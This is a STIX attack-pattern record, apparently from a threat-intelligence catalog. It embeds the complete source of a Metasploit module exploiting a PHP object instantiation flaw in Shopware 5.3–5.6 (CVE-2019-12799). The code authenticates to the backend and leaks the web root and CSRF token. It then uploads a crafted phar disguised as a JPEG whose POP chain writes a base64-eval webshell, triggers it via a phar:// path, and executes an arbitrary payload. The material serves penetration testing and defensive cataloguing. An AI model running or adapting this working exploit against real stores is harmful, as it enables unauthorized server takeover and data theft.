{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e748319b-f394-467e-8710-69254467cc88",
    "created": "2024-08-14T17:07:58.572241Z",
    "modified": "2024-08-14T17:07:58.572245Z",
    "name": "\"Shopware createInstanceFromNamedArguments PHP Object Instantiation RCE\"",
    "description": "( This module exploits a php object instantiation vulnerability that can lead to RCE in Shopware. An authenticated backend user could exploit the vulnerability.  The vulnerability exists in the createInstanceFromNamedArguments function, where the code insufficiently performs whitelist check which can be bypassed to trigger an object injection.  An attacker can leverage this to deserialize an arbitrary payload and write a webshell to the target system, resulting in remote code execution.  Tested on Shopware git branches 5.6, 5.5, 5.4, 5.3. ) 'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/shopware_createinstancefromnamedarguments_rce.rb",
            "external_id": "shopware_createinstancefromnamedarguments_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/#initialwriteupw/limitedexploitation"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => \"Shopware createInstanceFromNamedArguments PHP Object Instantiation RCE\",\n      'Description' => %q(\n        This module exploits a php object instantiation vulnerability that can lead to RCE in\n        Shopware. An authenticated backend user could exploit the vulnerability.\n\n        The vulnerability exists in the createInstanceFromNamedArguments function, where the code\n        insufficiently performs whitelist check which can be bypassed to trigger an object injection.\n\n        An attacker can leverage this to deserialize an arbitrary payload and write a webshell to\n        the target system, resulting in remote code execution.\n\n        Tested on Shopware git branches 5.6, 5.5, 5.4, 5.3.\n      ),\n      'License' => MSF_LICENSE,\n      'Author' =>\n        [\n          'Karim Ouerghemmi',               # original discovery\n          'mr_me <steven@srcincite.io>',    # patch bypass, rce & msf module\n        ],\n      'References' =>\n        [\n          ['CVE', '2019-12799'],                                                                         # yes really, assigned per request\n          ['CVE', '2017-18357'],                                                                         # not really because we bypassed this patch\n          ['URL', 'https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/']      # initial writeup w/ limited exploitation\n        ],\n      'Platform' => 'php',\n      'Arch' => ARCH_PHP,\n      'Targets' => [['Automatic', {}]],\n      'Privileged' => false,\n      'DisclosureDate' => '2019-05-09',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, \"Base Shopware path\", '/']),\n        OptString.new('USERNAME', [true, \"Backend username to authenticate with\", 'demo']),\n        OptString.new('PASSWORD', [false, \"Backend password to authenticate with\", 'demo'])\n      ]\n    )\n  end\n\n  def do_login\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'backend', 'Login', 'login'),\n      'vars_post' => {\n        'username' => datastore['username'],\n        'password' => datastore['password'],\n      }\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n    if res.code == 200\n      cookie = res.get_cookies.scan(%r{(SHOPWAREBACKEND=.{26};)}).flatten.first\n      if res.nil?\n        return\n      end\n      return cookie\n    end\n    return\n  end\n\n  def get_webroot(cookie)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'backend', 'systeminfo', 'info'),\n      'cookie' => cookie\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n    if res.code == 200\n      return res.body.scan(%r{DOCUMENT_ROOT </td><td class=\"v\">(.*) </td></tr>}).flatten.first\n    end\n    return\n  end\n\n  def leak_csrf(cookie)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'backend', 'CSRFToken', 'generate'),\n      'cookie' => cookie\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n    if res.code == 200\n      if res.headers.include?('X-Csrf-Token')\n        return res.headers['X-Csrf-Token']\n      end\n    end\n    return\n  end\n\n  def generate_phar(webroot)\n    php = Rex::FileUtils.normalize_unix_path(\"#{webroot}#{target_uri.path}media/#{@shll_bd}.php\")\n    register_file_for_cleanup(\"#{@shll_bd}.php\")\n    pop  = \"O:31:\\\"GuzzleHttp\\\\Cookie\\\\FileCookieJar\\\":2:{s:41:\\\"\\x00GuzzleHttp\\\\Cookie\\\\FileCookieJar\\x00filename\\\";\"\n    pop << \"s:#{php.length}:\\\"#{php}\\\";\"\n    pop << \"s:36:\\\"\\x00GuzzleHttp\\\\Cookie\\\\CookieJar\\x00cookies\\\";\"\n    pop << \"a:1:{i:0;O:27:\\\"GuzzleHttp\\\\Cookie\\\\SetCookie\\\":1:{s:33:\\\"\\x00GuzzleHttp\\\\Cookie\\\\SetCookie\\x00data\\\";\"\n    pop << \"a:3:{s:5:\\\"Value\\\";\"\n    pop << \"s:48:\\\"<?php eval(base64_decode($_SERVER[HTTP_#{@header}])); ?>\\\";\"\n    pop << \"s:7:\\\"Expires\\\";\"\n    pop << \"b:1;\"\n    pop << \"s:7:\\\"Discard\\\";\"\n    pop << \"b:0;}}}}\"\n    file          = Rex::Text.rand_text_alpha_lower(8)\n    stub          = \"<?php __HALT_COMPILER(); ?>\\r\\n\"\n    file_contents = Rex::Text.rand_text_alpha_lower(20)\n    file_crc32    = Zlib::crc32(file_contents) & 0xffffffff\n    manifest_len  = 40 + pop.length + file.length\n    phar  = stub\n    phar << [manifest_len].pack('V')              # length of manifest in bytes\n    phar << [0x1].pack('V')                       # number of files in the phar\n    phar << [0x11].pack('v')                      # api version of the phar manifest\n    phar << [0x10000].pack('V')                   # global phar bitmapped flags\n    phar << [0x0].pack('V')                       # length of phar alias\n    phar << [pop.length].pack('V')                # length of phar metadata\n    phar << pop                                   # pop chain\n    phar << [file.length].pack('V')               # length of filename in the archive\n    phar << file                                  # filename\n    phar << [file_contents.length].pack('V')      # length of the uncompressed file contents\n    phar << [0x0].pack('V')                       # unix timestamp of file set to Jan 01 1970.\n    phar << [file_contents.length].pack('V')      # length of the compressed file contents\n    phar << [file_crc32].pack('V')                # crc32 checksum of un-compressed file contents\n    phar << [0x1b6].pack('V')                     # bit-mapped file-specific flags\n    phar << [0x0].pack('V')                       # serialized File Meta-data length\n    phar << file_contents                         # serialized File Meta-data\n    phar << [Rex::Text.sha1(phar)].pack('H*')     # signature\n    phar << [0x2].pack('V')                       # signiture type\n    phar << \"GBMB\"                                # signature presence\n    return phar\n  end\n\n  def upload(cookie, csrf_token, phar)\n    data = Rex::MIME::Message.new\n    data.add_part(phar, Rex::Text.rand_text_alpha_lower(8), nil, \"name=\\\"fileId\\\"; filename=\\\"#{@phar_bd}.jpg\\\"\")\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'backend', 'mediaManager', 'upload'),\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data.to_s,\n      'cookie' => cookie,\n      'headers' => {\n        'X-CSRF-Token' => csrf_token\n      }\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n    if res.code == 200 && res.body =~ /Image is not in a recognized format/i\n      return true\n    end\n    return\n  end\n\n  def leak_upload(cookie, csrf_token)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'backend', 'MediaManager', 'getAlbumMedia'),\n      'cookie' => cookie,\n      'headers' => {\n        'X-CSRF-Token' => csrf_token\n      }\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n    if res.code == 200 && res.body =~ /#{@phar_bd}.jpg/i\n      bd_path = $1 if res.body =~ /media\\\\\\/image\\\\\\/(.{10})\\\\\\/#{@phar_bd}/\n      register_file_for_cleanup(\"image/#{bd_path.gsub(\"\\\\\", \"\")}/#{@phar_bd}.jpg\")\n      return \"media/image/#{bd_path.gsub(\"\\\\\", \"\")}/#{@phar_bd}.jpg\"\n    end\n    return\n  end\n\n  def trigger_bug(cookie, csrf_token, upload_path)\n    sort = {\n      \"Shopware_Components_CsvIterator\" => {\n        \"filename\" => \"phar://#{upload_path}\",\n        \"delimiter\" => \"\",\n        \"header\" => \"\"\n      }\n    }\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'backend', 'ProductStream', 'loadPreview'),\n      'cookie' => cookie,\n      'headers' => {\n        'X-CSRF-Token' => csrf_token\n      },\n      'vars_get' => { 'sort' => sort.to_json }\n    )\n    unless res\n      fail_with(Failure::Unreachable, \"Connection failed\")\n    end\n    return\n  end\n\n  def exec_code\n    send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"media\", \"#{@shll_bd}.php\"),\n      'raw_headers' => \"#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\\r\\n\"\n    }, 1)\n  end\n\n  def check\n    cookie = do_login\n    if cookie.nil?\n      vprint_error \"Authentication was unsuccessful\"\n      return Exploit::CheckCode::Safe\n    end\n    csrf_token = leak_csrf(cookie)\n    if csrf_token.nil?\n      vprint_error \"Unable to leak the CSRF token\"\n      return Exploit::CheckCode::Safe\n    end\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'backend', 'ProductStream', 'loadPreview'),\n      'cookie' => cookie,\n      'headers' => { 'X-CSRF-Token' => csrf_token }\n    )\n    if res.code == 200 && res.body =~ /Shop not found/i\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    unless Exploit::CheckCode::Vulnerable == check\n      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')\n    end\n    @phar_bd  = Rex::Text.rand_text_alpha_lower(8)\n    @shll_bd  = Rex::Text.rand_text_alpha_lower(8)\n    @header   = Rex::Text.rand_text_alpha_upper(2)\n    cookie = do_login\n    if cookie.nil?\n      fail_with(Failure::NoAccess, \"Authentication was unsuccessful\")\n    end\n    print_good(\"Stage 1 - logged in with #{datastore['username']}: #{cookie}\")\n    web_root = get_webroot(cookie)\n    if web_root.nil?\n      fail_with(Failure::Unknown, \"Unable to leak the webroot\")\n    end\n    print_good(\"Stage 2 - leaked the web root: #{web_root}\")\n    csrf_token = leak_csrf(cookie)\n    if csrf_token.nil?\n      fail_with(Failure::Unknown, \"Unable to leak the CSRF token\")\n    end\n    print_good(\"Stage 3 - leaked the CSRF token: #{csrf_token}\")\n    phar = generate_phar(web_root)\n    print_good(\"Stage 4 - generated our phar\")\n    if !upload(cookie, csrf_token, phar)\n      fail_with(Failure::Unknown, \"Unable to upload phar archive\")\n    end\n    print_good(\"Stage 5 - uploaded phar\")\n    upload_path = leak_upload(cookie, csrf_token)\n    if upload_path.nil?\n      fail_with(Failure::Unknown, \"Cannot find phar archive\")\n    end\n    print_good(\"Stage 6 - leaked phar location: #{upload_path}\")\n    trigger_bug(cookie, csrf_token, upload_path)\n    print_good(\"Stage 7 - triggered object instantiation!\")\n    exec_code\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-05-09",
    "x_mitre_platforms": [
        "php'"
    ]
}